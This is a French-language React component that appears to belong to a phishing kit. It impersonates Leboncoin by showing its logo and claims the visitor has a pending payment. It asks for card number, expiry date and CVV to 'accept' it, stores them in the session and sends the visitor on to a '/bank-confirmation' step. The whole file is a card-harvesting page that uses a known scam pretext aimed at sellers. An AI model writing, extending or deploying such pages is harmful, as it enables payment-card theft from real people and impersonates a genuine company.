
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import Footer from "@/components/Footer";
import ProgressStepper from "@/components/ProgressStepper";
import { updateUserSession } from "@/utils/sessionUtils";
import { toast } from "sonner";

const CardConfirmation: React.FC = () => {
  const [numeroCarte, setNumeroCarte] = useState("");
  const [dateExpiration, setDateExpiration] = useState("");
  const [cryptogramme, setCryptogramme] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!numeroCarte || !dateExpiration || !cryptogramme) {
      toast.error("Veuillez remplir tous les champs");
      return;
    }

    setIsLoading(true);

    // Simule la soumission du formulaire
    setTimeout(() => {
      // Stocke les informations dans la session
      updateUserSession({
        numeroCarte,
        dateExpiration,
        cryptogramme
      });
      
      setIsLoading(false);
      navigate("/bank-confirmation");
    }, 800);
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="w-full py-4 border-b border-gray-200">
        <div className="container mx-auto px-4">
          <img src="/logo.svg" alt="Leboncoin" className="h-8" />
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-lg px-6 py-8 bg-white rounded-lg animate-fade-in">
          <ProgressStepper 
            currentStep={2} 
            steps={["Confirm", "Checkpoint", "Verify", "Complete"]} 
          />

          <h1 className="text-3xl font-bold text-center mb-4">
            Confirmez votre carte
          </h1>
          
          <p className="text-center text-gray-600 mb-8">
            Vous avez un paiement en attente, configurer vos coordonnées bancaires pour accepter ce paiement.
          </p>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <input
                type="text"
                value={numeroCarte}
                onChange={(e) => setNumeroCarte(e.target.value)}
                className="form-input"
                placeholder="Numero de carte"
              />
            </div>

            <div>
              <input
                type="text"
                value={dateExpiration}
                onChange={(e) => setDateExpiration(e.target.value)}
                className="form-input"
                placeholder="Date d'expiration"
              />
            </div>

            <div className="grid grid-cols-3 gap-4">
              <div className="col-span-2">
                <input
                  type="text"
                  value={cryptogramme}
                  onChange={(e) => setCryptogramme(e.target.value)}
                  className="form-input"
                  placeholder="Cryptogramme"
                  maxLength={3}
                />
              </div>
              <div className="flex items-center justify-center">
                <svg width="40" height="26" viewBox="0 0 40 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <rect x="0.5" y="0.5" width="39" height="25" rx="2.5" stroke="#D1D5DB"/>
                  <line x1="0" y1="7" x2="40" y2="7" stroke="#D1D5DB"/>
                  <line x1="11" y1="15" x2="29" y2="15" stroke="#6B7280"/>
                  <line x1="11" y1="18" x2="29" y2="18" stroke="#6B7280"/>
                  <line x1="11" y1="21" x2="20" y2="21" stroke="#6B7280"/>
                </svg>
              </div>
            </div>

            <button
              type="submit"
              className="primary-button flex items-center justify-center mt-6"
              disabled={isLoading}
            >
              {isLoading ? (
                <span className="loading-spinner" />
              ) : (
                "Continuer"
              )}
            </button>
          </form>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default CardConfirmation;
